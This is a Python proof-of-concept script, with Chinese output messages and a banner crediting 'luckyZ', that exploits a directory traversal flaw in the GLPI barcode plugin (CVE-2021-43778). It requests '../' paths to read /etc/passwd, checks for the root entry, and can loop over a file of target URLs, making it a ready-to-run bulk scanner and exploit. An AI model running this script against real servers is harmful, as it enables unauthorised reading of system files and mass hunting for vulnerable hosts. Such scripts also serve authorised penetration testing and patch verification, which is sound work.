#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import requests
from bs4 import BeautifulSoup
import re
import json


def poc(target):
    url = target.strip('/') + '/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd'
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Connection": "close",
    }

    try:
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        response_text = response.text
        if 'root:x:0' in response_text:

            return "[+] {} 存在目录遍历漏洞".format(target)
        else:
            return "[-] {} 不存在目录遍历漏洞".format(target)
    except Exception:
        pass


if __name__ == "__main__":
    print('''
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██╗      ██╗  ██╗██████╗ ███████╗███████╗ █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗███║      ██║  ██║╚════██╗╚════██║╚════██║██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝╚██║█████╗███████║ █████╔╝    ██╔╝    ██╔╝╚█████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ██║╚════╝╚════██║ ╚═══██╗   ██╔╝    ██╔╝ ██╔══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗ ██║           ██║██████╔╝   ██║     ██║  ╚█████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝           ╚═╝╚═════╝    ╚═╝     ╚═╝   ╚════╝ 
                       GLPI 目录遍历漏洞(CVE-2021-43778)     by luckyZ          
    ''')
    print("*" * 50)

    parser = argparse.ArgumentParser(description='GLPI目录遍历漏洞(CVE-2021-43778)')
    parser.add_argument('-u', type=str, help='url')
    parser.add_argument('-f', help='file', type=str)
    args = parser.parse_args()
    if args.u:
        r = poc(args.u)
        print(r)
    if args.f:
        with open(args.f, "r") as f:
            for url in f.readlines():
                url = url.strip("\n").strip(" ")
                r = poc(url)
                # print(type(r))
                print(r)




